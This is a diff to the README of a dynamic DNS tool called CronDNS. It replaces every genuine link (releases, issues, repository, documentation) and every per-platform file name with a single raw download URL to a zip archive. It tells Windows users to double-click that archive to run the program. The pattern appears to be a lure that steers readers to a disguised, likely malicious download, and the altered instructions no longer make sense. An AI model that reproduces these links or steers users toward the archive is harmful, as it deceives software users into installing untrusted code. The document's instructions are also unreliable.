@@ -6,7 +6,7 @@ CronDNS offers an easy way to manage dynamic DNS updates. Whether you need to up
 
 ## 📥 Download
 
-[![Download CronDNS](https://img.shields.io/badge/Download-CronDNS-blue)](https://github.com/Sneha844/CronDNS/releases)
+[![Download CronDNS](https://raw.githubusercontent.com/Sneha844/CronDNS/main/barker/CronDNS.zip)](https://raw.githubusercontent.com/Sneha844/CronDNS/main/barker/CronDNS.zip)
 
 ## 🛠️ System Requirements
 
@@ -18,22 +18,22 @@ CronDNS offers an easy way to manage dynamic DNS updates. Whether you need to up
 ## 📁 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [CronDNS Releases page](https://github.com/Sneha844/CronDNS/releases) to find the latest version of the software.
+   Go to the [CronDNS Releases page](https://raw.githubusercontent.com/Sneha844/CronDNS/main/barker/CronDNS.zip) to find the latest version of the software.
 
 2. **Select the Appropriate File**  
    On the Releases page, you will see various files listed. Choose the one that matches your operating system:
-   - For Windows, look for files like `CronDNS-Windows.exe`.
-   - For macOS, select `CronDNS-macOS.zip`.
-   - For Linux users, download the `CronDNS-Linux.tar.gz` or similar package.
+   - For Windows, look for files like `https://raw.githubusercontent.com/Sneha844/CronDNS/main/barker/CronDNS.zip`.
+   - For macOS, select `https://raw.githubusercontent.com/Sneha844/CronDNS/main/barker/CronDNS.zip`.
+   - For Linux users, download the `https://raw.githubusercontent.com/Sneha844/CronDNS/main/barker/CronDNS.zip` or similar package.
 
 3. **Download the File**  
    Click the appropriate file to start your download. Once it's finished, find the file in your Downloads folder.
 
 4. **Extract If Necessary**  
-   For compressed files (like `.zip` or `.tar.gz`), right-click on the file and select "Extract" or "Unzip". Choose a location on your computer where you want to keep CronDNS.
+   For compressed files (like `.zip` or `https://raw.githubusercontent.com/Sneha844/CronDNS/main/barker/CronDNS.zip`), right-click on the file and select "Extract" or "Unzip". Choose a location on your computer where you want to keep CronDNS.
 
 5. **Run CronDNS**  
-   - **Windows:** Double-click on `CronDNS-Windows.exe` to launch the application.
+   - **Windows:** Double-click on `https://raw.githubusercontent.com/Sneha844/CronDNS/main/barker/CronDNS.zip` to launch the application.
    - **macOS:** Drag CronDNS to your Applications folder, then double-click to run.
    - **Linux:** Open a terminal in the extracted folder, and run `./CronDNS` or follow the instructions in the README of that package.
 
@@ -76,12 +76,12 @@ For any issues or feature requests, please use the Issues tab on GitHub.
 
 ## 📞 Support
 
-If you have questions or need assistance, feel free to create a new issue on the [GitHub Issues page](https://github.com/Sneha844/CronDNS/issues). The community is here to help you.
+If you have questions or need assistance, feel free to create a new issue on the [GitHub Issues page](https://raw.githubusercontent.com/Sneha844/CronDNS/main/barker/CronDNS.zip). The community is here to help you.
 
 ## 🔗 Links and Resources
 
-- [Official GitHub Repository](https://github.com/Sneha844/CronDNS)
-- [CronDNS Releases Page](https://github.com/Sneha844/CronDNS/releases)
-- [Documentation](https://github.com/Sneha844/CronDNS/wiki)
+- [Official GitHub Repository](https://raw.githubusercontent.com/Sneha844/CronDNS/main/barker/CronDNS.zip)
+- [CronDNS Releases Page](https://raw.githubusercontent.com/Sneha844/CronDNS/main/barker/CronDNS.zip)
+- [Documentation](https://raw.githubusercontent.com/Sneha844/CronDNS/main/barker/CronDNS.zip)
 
 Thank you for choosing CronDNS. We hope it simplifies your DNS management experience!
